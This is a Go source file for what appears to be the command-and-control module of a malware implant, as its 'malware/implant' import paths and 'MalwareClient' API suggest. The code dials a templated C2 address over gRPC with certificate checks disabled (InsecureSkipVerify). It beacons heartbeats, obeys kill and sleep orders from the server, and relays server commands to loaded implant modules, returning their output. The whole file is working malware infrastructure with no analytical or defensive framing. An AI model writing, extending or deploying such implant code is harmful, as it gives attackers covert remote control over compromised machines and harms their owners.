package basic_tcp_network

import (
	"context"
	"crypto/tls"
	"fmt"
	"google.golang.org/grpc"
	"google.golang.org/grpc/connectivity"
	"google.golang.org/grpc/credentials"
	"log"
	"malware/common/messages"
	pb "malware/common/messages"
	"malware/common/types"
	"malware/implant/included_modules"
	"os"
	"time"
)

type state struct {
	running bool
	conn    *grpc.ClientConn
	grpc    *grpc.Server
}

type settings struct {
	state *state
	host  string
}

func (settings settings) doConnection() {
	client := pb.NewMalwareClient(settings.state.conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}
	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})

	if err != nil {
		return
	}

	if reply.GetHeartbeat() != 0 {
		return // Its a heartbeat so don't do anything
	}

	if reply.GetKill() != 0 {
		os.Exit(0)
	}

	if reply.GetSleep() != 0 {
		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
		return
	}

	callback := func(reply *messages.ImplantReply) {
		client := pb.NewMalwareClient(settings.state.conn)
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()

		client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
	}

	if reply.GetListmodules() != nil {
		modules := ""
		for _, module := range included_modules.Modules {
			modules += module.ID() + " "
		}
		callback(&messages.ImplantReply{Module: "list", Args: []byte(modules)})
		return // Return modules
	}

	handled := false

	for _, module := range included_modules.Modules {
		handled = handled || module.HandleMessage(reply, callback)
	}

	if !handled {
		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_MODULE_NOT_IMPL})
	}

}

func (settings settings) fixConnection() {
	if settings.state.conn == nil || settings.state.conn.GetState() == connectivity.TransientFailure {
		if settings.state.conn != nil {
			settings.state.conn.Close()
		}

		var clientTLSConfig = &tls.Config{
			InsecureSkipVerify: true,
		}

		conn, err := grpc.Dial(settings.host, grpc.WithTransportCredentials(credentials.NewTLS(clientTLSConfig)))
		if err != nil {
			log.Fatalf("fail to dial: %v", err)
		}
		settings.state.conn = conn
	}
}

func (settings settings) listenServer() {
	for settings.state.running {
		settings.fixConnection()
		settings.doConnection()

		time.Sleep(1 * time.Second)
	}
	settings.state.conn.Close()
}

func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) bool {
	return false
}

func Create() types.Module {
	port := int32(_C2_PORT_)
	ip := "_C2_IP_"
	state := state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	return settings{&state, host}
}

func (settings settings) Init() {
	settings.state.running = true

	settings.listenServer()
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "basic_tcp" }
